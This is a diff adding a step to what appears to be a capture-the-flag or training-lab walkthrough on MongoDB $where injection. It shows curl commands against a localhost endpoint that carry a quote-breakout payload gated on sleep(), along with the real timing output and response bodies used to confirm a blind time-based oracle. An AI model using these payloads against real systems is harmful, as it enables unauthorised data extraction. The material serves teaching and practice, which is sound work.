@@ -195,6 +195,45 @@ case, and not the actual lesson this floor teaches. The lesson is the
 `$where` quote-breakout and the timing extraction itself; both names
 are given so that's what gets tested.
 
+**Step 0, confirm the oracle actually works**, before trusting any
+bisection result built on top of it. Send the exact same gated template
+twice, once with a condition hardcoded `true`, once hardcoded `false`,
+and compare elapsed time, not response body:
+
+```bash
+# true condition, expect a slow response
+curl -s -o /dev/null -w "elapsed: %{time_total}s\n" -G "http://localhost:8000/p4/loophole" \
+    --data-urlencode "codename=x' || (this.codename=='ghost' && (1==1) && sleep(400)) || '"
+
+# false condition, expect a fast response
+curl -s -o /dev/null -w "elapsed: %{time_total}s\n" -G "http://localhost:8000/p4/loophole" \
+    --data-urlencode "codename=x' || (this.codename=='ghost' && (1==2) && sleep(400)) || '"
+```
+
+Real output, this exact seed:
+
+```
+true  (1==1): elapsed: 0.409653s
+false (1==2): elapsed: 0.013085s
+```
+
+And the response *bodies*, to confirm the blind-in-band claim actually
+holds, not just assumed:
+
+```json
+// true condition
+{"codename":"x' || (this.codename=='ghost' && (1==1) && sleep(400)) || '","submitted":true}
+// false condition
+{"codename":"x' || (this.codename=='ghost' && (1==2) && sleep(400)) || '","submitted":true}
+```
+
+Identical shape both times, `submitted:true`, nothing else. The ~400ms
+gap is the only signal that exists anywhere in this exchange, confirmed
+before it's trusted as the foundation for the character-by-character
+walk below, exactly the same "verify the oracle, then use it" discipline
+`solvers/p1_5.py`'s own `confirm_injection_and_silence()` step applies
+for SQL's time-based blind technique.
+
 Gate every payload behind `this.codename=='ghost'` so `sleep()` only
 ever fires for the one hidden document being probed, not once per
 document `$where` happens to scan (the same row-count-multiplication
